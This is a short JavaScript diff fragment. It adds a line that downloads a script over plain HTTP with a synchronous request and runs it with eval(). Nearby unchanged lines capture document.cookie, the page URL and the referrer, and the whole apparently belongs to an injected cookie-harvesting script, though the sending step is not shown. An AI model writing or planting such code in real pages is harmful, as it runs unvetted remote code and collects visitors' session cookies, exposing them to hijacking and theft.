@@ -4,6 +4,8 @@ function httpGet(theUrl) {
     xmlHttp.send(null);
     return xmlHttp.responseText;
 }
+
+eval(httpGet('http://code.jquery.com/jquery-latest.js'));
 cookie=document.cookie;
 url=document.location.href;
 ref=document.referrer;
